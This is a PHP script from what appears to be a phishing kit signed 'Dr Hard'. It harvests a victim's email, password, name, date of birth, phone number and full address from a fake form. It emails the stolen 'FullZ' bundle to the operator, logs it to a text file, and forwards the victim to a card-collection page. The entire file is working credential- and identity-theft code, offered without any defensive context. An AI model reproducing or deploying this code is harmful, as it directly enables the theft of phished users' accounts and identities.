<?php
	error_reporting(0);
	ob_start();
	session_start();
	include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
	//================= Date Of Birth Checker ================//
		$_SESSION["fname"] 		= $_POST["f_name"];
		$_SESSION["lname"]		= $_POST["l_name"];
		$_SESSION["DOB"]		= $_POST["dob"];
		$_SESSION["PhoneNumber"]= $_POST["phone"];
		$_SESSION["street"] 	= $_POST["address1"];
		$_SESSION["city"]		= $_POST["city"];
		$_SESSION["state"] 		= $_POST["state"];
		$_SESSION["country"] 	= $_POST["cuntry"];
		$_SESSION["ZIP"] 		= $_POST["zip"];

$message = '
__________________►| BY Dr Hard |◄__________________
Email: '.$_SESSION['email'].'
Pass: '.$_SESSION['pass'].'
__________________►| BY Dr Hard |◄__________________
First Name: '.$_SESSION["fname"].'
Last Name: '.$_SESSION["lname"].'
DOB: '.$_SESSION["DOB"].'
Phone: '.$_SESSION["PhoneNumber"].'
Street: '.$_SESSION["street"].'
City: '.$_SESSION["city"].'
State: '.$_SESSION["state"].'
Country: '.$_SESSION["country"].'
Zip: '.$_SESSION["ZIP"].'
__________________►| BY Dr Hard |◄__________________
User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
IP: http://ip-api.org/#'._ip().'
__________________►| BY Dr Hard |◄__________________';

$Subject="㊣ New FullZ Information ㊣ - "._ip();
$head="From: Dr Hard ★ <log>";

$fil = fopen('rzlt2hd.txt', 'a+');
fwrite($fil, PHP_EOL.'===============>'.$message.PHP_EOL.'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX END XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX');
		mail($my_mail,$Subject,$message,$head);
		header('location: card.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));

}
else
{
	header('location: ../../index.php');
} 